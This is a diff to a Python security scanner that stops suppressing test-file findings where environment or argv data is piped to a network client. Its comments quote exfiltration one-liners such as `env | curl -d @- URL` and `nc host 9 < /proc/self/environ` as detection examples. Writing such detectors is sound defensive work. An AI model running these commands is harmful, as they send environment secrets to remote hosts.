@@ -739,6 +739,7 @@ def _window_has_shell_net_sink(lines: list[str], line_idx: int, span: int = 8) -
             return True
     return False
 
+
 # An environment / argv READ on the same line as a network client. Shapes:
 # `env | curl …`, `printenv | nc host 9`, `node -p "process.argv" | curl …`,
 # `curl -d "$(env)" URL`, `nc host 9 < /proc/self/environ`. `env`/`printenv`
@@ -1694,11 +1695,20 @@ def classify(
     # file — an ENV_INJECTION hijack-var assignment (LD_PRELOAD / NODE_OPTIONS
     # / …) and an OBFUSCATION decode→exec shape (… | bash / eval). Test files
     # are EXECUTED at publish time, so those remain real threats.
+    # Exfil-shape carve-out (2026-11-27, shell-exfil-fn): `env | curl -d @- URL`,
+    # `printenv | nc host 9`, `node -p "process.argv" | curl …` inside a
+    # tests/ / fixtures/ / test-*.sh path came back `safe_literal` (hidden, info)
+    # for ENV_RECON and CMD_INJECTION — a malicious script parked under tests/
+    # exfiltrated the environment with no visible finding. A test fixture never
+    # ships its environment to a remote host, so an env/argv read handed to a
+    # non-loopback network client stays visible at catalog severity in ANY file.
     if _is_shell_test_file(file_path) and rule_id in _SHELL_TEST_BLANKET_SUPPRESS_RULES:
         if rule_id == "ENV_INJECTION" and _shell_line_is_hijack_var_injection(line_text):
             pass  # hijack-var injection in a test file → keep visible
         elif rule_id == "OBFUSCATION" and _shell_line_has_exec_sink(line_text):
             pass  # decode→exec in a test file → keep visible
+        elif _shell_line_is_env_read_to_net_sink(line_text):
+            pass  # env/argv read piped/passed to a network tool → keep visible
         else:
             return "safe_literal"
 
